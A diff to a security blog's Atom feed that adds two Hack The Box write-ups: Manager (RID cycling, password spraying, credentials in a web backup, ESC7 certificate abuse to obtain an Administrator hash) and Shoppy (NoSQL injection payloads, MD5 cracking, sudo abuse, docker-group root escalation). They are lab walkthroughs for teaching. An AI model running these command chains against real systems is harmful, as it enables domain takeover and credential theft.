@@ -1,4 +1,594 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-25T14:11:23+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Driver</title><link href="http://localhost:4000/posts/driver/" rel="alternate" type="text/html" title="Hack The Box: Driver" /><published>2026-10-25T00:00:00+05:30</published><updated>2026-10-25T00:00:00+05:30</updated><id>http://localhost:4000/posts/driver</id><content type="html" xml:base="http://localhost:4000/posts/driver/"><![CDATA[<h1 id="driver---hack-the-box">Driver - Hack The Box</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-26T23:35:32+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Manager</title><link href="http://localhost:4000/posts/manager/" rel="alternate" type="text/html" title="Hack The Box: Manager" /><published>2026-10-26T00:00:00+05:30</published><updated>2026-10-26T00:00:00+05:30</updated><id>http://localhost:4000/posts/manager</id><content type="html" xml:base="http://localhost:4000/posts/manager/"><![CDATA[<h1 id="manager">Manager</h1>
+
+<p>Manager is a Windows Active Directory machine that demonstrates how exposed backup files, weak credentials, and misconfigured Active Directory Certificate Services (AD CS) can combine into a complete domain compromise.</p>
+
+<p>The initial foothold comes from credentials recovered from a website backup. From there, the path to Administrator involves abusing the CA’s <code class="language-plaintext highlighter-rouge">ManageCa</code> permission through <strong>ESC7</strong>.</p>
+
+<h2 id="1-enumeration">1. Enumeration</h2>
+
+<p>Start with a full TCP port scan and service detection.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --min-rate 1000 -oN ports.txt TARGET_IP
+nmap -sC -sV -p &lt;OPEN_PORTS&gt; -oN services.txt TARGET_IP
+</code></pre></div></div>
+
+<p>The scan identifies several Windows and Active Directory services, including:</p>
+
+<ul>
+  <li>
+    <p>DNS (53)</p>
+  </li>
+  <li>
+    <p>HTTP (80)</p>
+  </li>
+  <li>
+    <p>Kerberos (88)</p>
+  </li>
+  <li>
+    <p>LDAP (389, 636)</p>
+  </li>
+  <li>
+    <p>SMB (445)</p>
+  </li>
+  <li>
+    <p>Microsoft SQL Server (1433)</p>
+  </li>
+  <li>
+    <p>WinRM (5985)</p>
+  </li>
+  <li>
+    <p>Active Directory Global Catalog (3268, 3269)</p>
+  </li>
+</ul>
+
+<p>The web service runs Microsoft IIS, while the other exposed services suggest that the target is an Active Directory domain controller.</p>
+
+<p>Add the domain and hostname to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "TARGET_IP manager.htb dc01.manager.htb" | sudo tee -a /etc/hosts
+</code></pre></div></div>
+
+<h2 id="2-smb-enumeration-and-rid-cycling">2. SMB Enumeration and RID Cycling</h2>
+
+<p>Anonymous SMB access reveals the available shares, but attempting to browse <code class="language-plaintext highlighter-rouge">NETLOGON</code> and <code class="language-plaintext highlighter-rouge">SYSVOL</code> does not provide access.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N -L //TARGET_IP/
+</code></pre></div></div>
+
+<p>Use Impacket’s <code class="language-plaintext highlighter-rouge">lookupsid.py</code> to enumerate domain accounts through SID lookups.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-lookupsid 'anonymous@manager.htb' -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>Among the discovered users are <code class="language-plaintext highlighter-rouge">Zhong</code>, <code class="language-plaintext highlighter-rouge">Cheng</code>, <code class="language-plaintext highlighter-rouge">Ryan</code>, <code class="language-plaintext highlighter-rouge">Raven</code>, <code class="language-plaintext highlighter-rouge">JinWoo</code>, <code class="language-plaintext highlighter-rouge">ChinHae</code>, and <code class="language-plaintext highlighter-rouge">Operator</code>.</p>
+
+<p>Save the usernames to a file and check whether any accounts are vulnerable to AS-REP roasting.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers manager.htb/ \
+  -dc-ip TARGET_IP \
+  -usersfile users.list \
+  -request
+</code></pre></div></div>
+
+<p>The discovered accounts do not yield a usable AS-REP roast in this attempt, so continue with other authentication avenues.</p>
+
+<h2 id="3-discovering-weak-credentials">3. Discovering Weak Credentials</h2>
+
+<p>Test the discovered usernames against SMB using simple username-matching passwords.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb TARGET_IP -u users.list -p users.list
+</code></pre></div></div>
+
+<p>The successful credential pair is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: operator
+Password: operator
+</code></pre></div></div>
+
+<p>These credentials provide authenticated access to SMB and are also accepted by the MSSQL service.</p>
+
+<h2 id="4-mssql-enumeration">4. MSSQL Enumeration</h2>
+
+<p>Connect to SQL Server using Windows authentication.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-mssqlclient operator@TARGET_IP -windows-auth
+</code></pre></div></div>
+
+<p>Once connected, use <code class="language-plaintext highlighter-rouge">xp_dirtree</code> to enumerate accessible directories on the server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree C:\
+</code></pre></div></div>
+
+<p>The web root is particularly interesting:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree C:\inetpub\wwwroot
+</code></pre></div></div>
+
+<p>Among the website files is a backup archive:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>website-backup-27-07-23-old.zip
+</code></pre></div></div>
+
+<p>This is a useful lead: backup files often retain configuration values that should never have been exposed through a web server.</p>
+
+<h2 id="5-recovering-credentials-from-the-website-backup">5. Recovering Credentials from the Website Backup</h2>
+
+<p>Download the archive from the web server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://manager.htb/website-backup-27-07-23-old.zip -O web.zip
+unzip web.zip -d website-backup
+</code></pre></div></div>
+
+<p>Inspect the extracted configuration files, especially <code class="language-plaintext highlighter-rouge">.old-conf.xml</code>.</p>
+
+<p>The configuration contains LDAP connection details and credentials belonging to the domain user <code class="language-plaintext highlighter-rouge">raven</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;user&gt;raven@manager.htb&lt;/user&gt;
+&lt;password&gt;&lt;REDACTED&gt;&lt;/password&gt;
+</code></pre></div></div>
+
+<p>The credentials recovered from the backup work for Raven’s WinRM access.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i TARGET_IP -u raven -p '&lt;REDACTED&gt;'
+</code></pre></div></div>
+
+<p>This provides a remote PowerShell session as Raven.</p>
+
+<h3 id="user-flag">User flag</h3>
+
+<p>The user flag is obtained from Raven’s session. Its value is intentionally redacted in this public writeup.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type C:\Users\Raven\Desktop\user.txt
+</code></pre></div></div>
+
+<h2 id="6-enumerating-active-directory-certificate-services">6. Enumerating Active Directory Certificate Services</h2>
+
+<p>With authenticated access as Raven, enumerate the domain’s certificate authority and certificate templates.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad find \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -dc-ip TARGET_IP \
+  -dc-host dc01.manager.htb \
+  -target-ip TARGET_IP \
+  -stdout -enabled -vulnerable
+</code></pre></div></div>
+
+<p>The output identifies the certificate authority:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CA Name: manager-DC01-CA
+</code></pre></div></div>
+
+<p>More importantly, Raven has the <code class="language-plaintext highlighter-rouge">**ManageCa**</code> permission on the CA.</p>
+
+<p>This permission allows Raven to manage the certificate authority, including issuing pending certificate requests. Combined with the ability to enable the <code class="language-plaintext highlighter-rouge">SubCA</code> template, this creates an ESC7 privilege-escalation path.</p>
+
+<h2 id="7-exploiting-esc7">7. Exploiting ESC7</h2>
+
+<p>ESC7 involves excessive certificate authority management permissions. In this scenario, Raven can add themselves as a CA officer, enable the <code class="language-plaintext highlighter-rouge">SubCA</code> template, and manually issue a certificate request that the CA initially denies.</p>
+
+<h3 id="71-add-raven-as-a-ca-officer">7.1 Add Raven as a CA officer</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad ca \
+  -ca 'manager-DC01-CA' \
+  -add-officer raven \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -dc-ip TARGET_IP \
+  -dc-host dc01.manager.htb \
+  -target-ip TARGET_IP
+</code></pre></div></div>
+
+<h3 id="72-enable-the-subca-template">7.2 Enable the SubCA template</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad ca \
+  -ca 'manager-DC01-CA' \
+  -enable-template SubCA \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -dc-ip TARGET_IP \
+  -dc-host dc01.manager.htb \
+  -target-ip TARGET_IP
+</code></pre></div></div>
+
+<h3 id="73-request-a-certificate-for-administrator">7.3 Request a certificate for Administrator</h3>
+
+<p>Request a certificate using the <code class="language-plaintext highlighter-rouge">SubCA</code> template while specifying the Administrator UPN.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad req \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -ca 'manager-DC01-CA' \
+  -template SubCA \
+  -upn 'administrator@manager.htb' \
+  -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>The request is created, but the CA initially returns:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CERTSRV_E_TEMPLATE_DENIED
+</code></pre></div></div>
+
+<p>The denial does not end the attack. The request has been submitted and has a request ID, allowing the CA officer to issue it manually.</p>
+
+<p>Record the request ID from your own output; in this run, it was <code class="language-plaintext highlighter-rouge">21</code>.</p>
+
+<h3 id="74-issue-the-denied-request">7.4 Issue the denied request</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad ca \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -ca 'manager-DC01-CA' \
+  -issue-request 21 \
+  -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>The CA successfully issues the pending request.</p>
+
+<h3 id="75-retrieve-the-certificate">7.5 Retrieve the certificate</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad req \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -ca 'manager-DC01-CA' \
+  -template SubCA \
+  -retrieve 21 \
+  -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>Certipy saves the resulting certificate as <code class="language-plaintext highlighter-rouge">administrator.pfx</code>.</p>
+
+<h2 id="8-authenticate-as-administrator">8. Authenticate as Administrator</h2>
+
+<p>Use the issued certificate to authenticate and retrieve the Administrator account’s NTLM hash.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad auth \
+  -pfx administrator.pfx \
+  -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>The output provides an NTLM hash for Administrator. The actual hash is intentionally omitted.</p>
+
+<p>Authenticate to WinRM using the recovered hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i TARGET_IP \
+  -u administrator \
+  -H '&lt;REDACTED_NTLM_HASH&gt;'
+</code></pre></div></div>
+
+<p>This provides an Administrator shell on the target.</p>
+
+<h3 id="root-flag">Root flag</h3>
+
+<p>The root flag is obtained from the Administrator session. Its value is intentionally redacted.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type C:\Users\Administrator\Desktop\root.txt
+</code></pre></div></div>
+
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+<ol>
+  <li>
+    <p>Enumerate exposed Windows and Active Directory services.</p>
+  </li>
+  <li>
+    <p>Use RID cycling to discover domain accounts.</p>
+  </li>
+  <li>
+    <p>Find weak credentials for <code class="language-plaintext highlighter-rouge">operator</code>.</p>
+  </li>
+  <li>
+    <p>Authenticate to MSSQL and enumerate the IIS web root.</p>
+  </li>
+  <li>
+    <p>Download the website backup and recover Raven’s credentials.</p>
+  </li>
+  <li>
+    <p>Access the host through WinRM as Raven.</p>
+  </li>
+  <li>
+    <p>Identify the CA’s excessive <code class="language-plaintext highlighter-rouge">ManageCa</code> permission.</p>
+  </li>
+  <li>
+    <p>Abuse ESC7 by enabling <code class="language-plaintext highlighter-rouge">SubCA</code> and manually issuing an Administrator certificate request.</p>
+  </li>
+  <li>
+    <p>Authenticate with the certificate, recover the Administrator NTLM hash, and obtain a privileged WinRM session.</p>
+  </li>
+</ol>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="windows" /><category term="RID Cycling" /><category term="MSSQL" /><category term="ESC7" /><summary type="html"><![CDATA[Manager]]></summary></entry><entry><title type="html">Hack The Box: Shoppy</title><link href="http://localhost:4000/posts/shoppy/" rel="alternate" type="text/html" title="Hack The Box: Shoppy" /><published>2026-10-26T00:00:00+05:30</published><updated>2026-10-26T00:00:00+05:30</updated><id>http://localhost:4000/posts/shoppy</id><content type="html" xml:base="http://localhost:4000/posts/shoppy/"><![CDATA[<h1 id="htb-shoppy">HTB Shoppy</h1>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>I started with an Nmap scan to identify the exposed services.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p22,80,9003 10.129.227.233
+</code></pre></div></div>
+
+<p>The scan revealed SSH on port 22 and an HTTP service on port 80 running nginx. The web server redirected requests to <code class="language-plaintext highlighter-rouge">shoppy.htb</code>, so I added the hostname to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "10.129.227.233 shoppy.htb" | sudo tee -a /etc/hosts
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 8.4p1 Debian</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>nginx 1.23.1</td>
+    </tr>
+    <tr>
+      <td>9003</td>
+      <td>—</td>
+      <td>Closed</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+
+<p>I used <code class="language-plaintext highlighter-rouge">ffuf</code> to discover accessible web paths.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -u http://shoppy.htb/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt
+</code></pre></div></div>
+
+<p>The scan identified <code class="language-plaintext highlighter-rouge">/login</code>, <code class="language-plaintext highlighter-rouge">/admin</code>, and <code class="language-plaintext highlighter-rouge">/exports</code>, among other directories. The login page became the primary target for further testing.</p>
+
+<h3 id="virtual-host-enumeration">Virtual Host Enumeration</h3>
+
+<p>Next, I enumerated subdomains using the HTTP <code class="language-plaintext highlighter-rouge">Host</code> header.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -u http://shoppy.htb/ \
+  -H "Host: FUZZ.shoppy.htb" \
+  -w ./wordlist.txt \
+  -fc 301
+</code></pre></div></div>
+
+<p>This revealed a virtual host named <code class="language-plaintext highlighter-rouge">mattermost</code>.</p>
+
+<p>I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "10.129.227.233 mattermost.shoppy.htb" | sudo tee -a /etc/hosts
+</code></pre></div></div>
+
+<p>Visiting <code class="language-plaintext highlighter-rouge">mattermost.shoppy.htb</code> revealed a Mattermost instance, which would become important later in the attack chain.</p>
+
+<h2 id="initial-access---nosql-injection">Initial Access - NoSQL Injection</h2>
+
+<h3 id="authentication-bypass">Authentication Bypass</h3>
+
+<p>While testing the login functionality on <code class="language-plaintext highlighter-rouge">shoppy.htb</code>, I discovered that the application was vulnerable to NoSQL injection.</p>
+
+<p><img src="/assets/images/shoppy_0.png" alt="Shoppy 0" /></p>
+
+<p>The following credentials bypassed the login check:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin' || '' === '
+password=pass
+</code></pre></div></div>
+
+<h3 id="extracting-user-hashes">Extracting User Hashes</h3>
+
+<p>Inside the admin panel, I found a user-search feature. Testing its <code class="language-plaintext highlighter-rouge">username</code> parameter revealed another NoSQL injection vulnerability.</p>
+
+<p>The following URL returned user records:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://shoppy.htb/admin/search-users?username='; return '' == '
+</code></pre></div></div>
+
+<p>The response contained two user records and their password hashes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[
+  {
+    "_id": "62db0e93d6d6a999a66ee67a",
+    "username": "admin",
+    "password": "&lt;HASH_REDACTED&gt;"
+  },
+  {
+    "_id": "62db0e93d6d6a999a66ee67b",
+    "username": "josh",
+    "password": "&lt;HASH_REDACTED&gt;"
+  }
+]
+</code></pre></div></div>
+
+<p>The hashes were 32 hexadecimal characters long, suggesting MD5. I used <code class="language-plaintext highlighter-rouge">hash-identifier</code> to confirm that MD5 was a plausible candidate.</p>
+
+<h3 id="cracking-joshs-hash">Cracking Josh’s Hash</h3>
+
+<p>I saved Josh’s hash to <code class="language-plaintext highlighter-rouge">hash.txt</code> and used Hashcat with the RockYou wordlist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat hash.txt \
+  --wordlist /usr/share/wordlists/rockyou.txt \
+  -m 0
+</code></pre></div></div>
+
+<p>Hashcat recovered the password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;HASH_REDACTED&gt;:&lt;REDACTED&gt;
+</code></pre></div></div>
+
+<p>I now had a valid credential pair to test against the other discovered services.</p>
+
+<h2 id="lateral-movement---mattermost">Lateral Movement - Mattermost</h2>
+
+<p>I tried Josh’s recovered credentials on <code class="language-plaintext highlighter-rouge">mattermost.shoppy.htb</code>, and they worked.</p>
+
+<p>After logging in, I explored the available channels and found a conversation in the <code class="language-plaintext highlighter-rouge">deploy</code> channel containing credentials for another user.</p>
+
+<p>The message from Josh read:</p>
+
+<p><img src="/assets/images/shoppy_1.png" alt="Shoppy 1" /></p>
+
+<p>The conversation exposed credentials for the <code class="language-plaintext highlighter-rouge">jaeger</code> account. I tested them against SSH.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh jaeger@10.129.227.233
+</code></pre></div></div>
+
+<p>Using the password <code class="language-plaintext highlighter-rouge">&lt;REDACTED&gt;</code>, I successfully logged in as <code class="language-plaintext highlighter-rouge">jaeger</code>.</p>
+
+<h2 id="privilege-escalation---jaeger-to-deploy">Privilege Escalation - jaeger to deploy</h2>
+
+<h3 id="enumerating-sudo-permissions">Enumerating Sudo Permissions</h3>
+
+<p>After gaining an SSH shell, I checked the commands available through <code class="language-plaintext highlighter-rouge">sudo</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+</code></pre></div></div>
+
+<p>The output showed that <code class="language-plaintext highlighter-rouge">jaeger</code> could execute a specific program as the <code class="language-plaintext highlighter-rouge">deploy</code> user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+</code></pre></div></div>
+
+<p>I inspected the <code class="language-plaintext highlighter-rouge">/home/deploy</code> directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la /home/deploy
+</code></pre></div></div>
+
+<p>The directory contained a password-manager binary and two particularly interesting files:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rwxr--r-- 1 deploy deploy 18440 Jul 22 2022 password-manager
+-rw------- 1 deploy deploy   739 Feb  1 2022 password-manager.cpp
+-rw------- 1 deploy deploy    56 Jul 22 2022 creds.txt
+</code></pre></div></div>
+
+<p>The source file and <code class="language-plaintext highlighter-rouge">creds.txt</code> were readable only by <code class="language-plaintext highlighter-rouge">deploy</code>, but I could execute the password manager through the permitted <code class="language-plaintext highlighter-rouge">sudo</code> rule.</p>
+
+<h3 id="testing-the-recovered-password">Testing the Recovered Password</h3>
+
+<p>The program prompted for a master password. I initially tried Josh’s recovered password, but it was rejected.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u deploy /home/deploy/password-manager
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to Josh password manager!
+Please enter your master password: &lt;REDACTED&gt;
+Access denied! This incident will be reported !
+</code></pre></div></div>
+
+<p>Rather than guessing blindly, I decided to reverse-engineer the binary.</p>
+
+<h3 id="reverse-engineering-with-ghidra">Reverse Engineering with Ghidra</h3>
+
+<p>I opened the executable in Ghidra and examined its decompiled <code class="language-plaintext highlighter-rouge">main</code> function.</p>
+
+<p>The relevant logic appended individual characters to a string:</p>
+
+<p><img src="/assets/images/shoppy_2.png" alt="Shoppy 2" /></p>
+
+<p>The resulting string was compared with the password supplied by the user. If the comparison succeeded, the program executed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system("cat /home/deploy/creds.txt");
+</code></pre></div></div>
+
+<h3 id="retrieving-deploy-credentials">Retrieving deploy Credentials</h3>
+
+<p>I ran the password manager again with the discovered password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u deploy /home/deploy/password-manager
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to Josh password manager!
+Please enter your master password: &lt;REDACTED_RECOVERED_MASTER_PASS&gt;
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: &lt;REDACTED&gt;
+</code></pre></div></div>
+
+<p>This revealed the credentials for the <code class="language-plaintext highlighter-rouge">deploy</code> account.</p>
+
+<p>I switched to the account using the recovered password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su - deploy
+</code></pre></div></div>
+
+<h2 id="root-privilege-escalation---docker-group">Root Privilege Escalation - Docker Group</h2>
+
+<h3 id="checking-group-membership">Checking Group Membership</h3>
+
+<p>As <code class="language-plaintext highlighter-rouge">deploy</code>, I checked my group memberships.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">docker</code> group membership was the key to obtaining root access. On a typical Linux host, a user who can control the Docker daemon can create containers with access to host resources, including the host’s root filesystem.</p>
+
+<h3 id="mounting-the-host-filesystem">Mounting the Host Filesystem</h3>
+
+<p>The machine had an Alpine Docker image available locally:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker images
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+alpine       latest    d7d3d98c851f   4 years ago   5.53MB
+</code></pre></div></div>
+
+<p>I launched a container and mounted the host’s root filesystem at <code class="language-plaintext highlighter-rouge">/mnt</code> inside the container.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -it --rm -v /:/mnt alpine
+</code></pre></div></div>
+
+<p>Inside the container, the host filesystem was accessible:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /mnt
+ls
+</code></pre></div></div>
+
+<p>I then read the root flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /mnt/root/root.txt
+</code></pre></div></div>
+
+<p><strong>Root obtained.</strong></p>
+
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+<ol>
+  <li>
+    <p><strong>Enumeration:</strong> Discovered SSH, HTTP, and the <code class="language-plaintext highlighter-rouge">mattermost</code> virtual host.</p>
+  </li>
+  <li>
+    <p><strong>NoSQL injection:</strong> Bypassed the Shoppy login and accessed the admin panel.</p>
+  </li>
+  <li>
+    <p><strong>Hash extraction:</strong> Retrieved user hashes through the vulnerable search functionality.</p>
+  </li>
+  <li>
+    <p><strong>Password cracking:</strong> Cracked Josh’s MD5 hash using RockYou.</p>
+  </li>
+  <li>
+    <p><strong>Credential reuse:</strong> Logged into Mattermost and discovered <code class="language-plaintext highlighter-rouge">jaeger</code>’s credentials.</p>
+  </li>
+  <li>
+    <p><strong>Sudo abuse:</strong> Executed the password manager as <code class="language-plaintext highlighter-rouge">deploy</code>.</p>
+  </li>
+  <li>
+    <p><strong>Reverse engineering:</strong> Recovered the hardcoded master password <code class="language-plaintext highlighter-rouge">Sample</code> from the binary.</p>
+  </li>
+  <li>
+    <p><strong>Docker abuse:</strong> Used <code class="language-plaintext highlighter-rouge">deploy</code>’s Docker group membership to mount the host filesystem and read the root flag.</p>
+  </li>
+</ol>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="linux" /><category term="NoSQL Injection" /><category term="Reverse Engineering" /><category term="Docker" /><summary type="html"><![CDATA[HTB Shoppy]]></summary></entry><entry><title type="html">Hack The Box: Driver</title><link href="http://localhost:4000/posts/driver/" rel="alternate" type="text/html" title="Hack The Box: Driver" /><published>2026-10-25T00:00:00+05:30</published><updated>2026-10-25T00:00:00+05:30</updated><id>http://localhost:4000/posts/driver</id><content type="html" xml:base="http://localhost:4000/posts/driver/"><![CDATA[<h1 id="driver---hack-the-box">Driver - Hack The Box</h1>
 
 <h2 id="enumeration">Enumeration</h2>
 
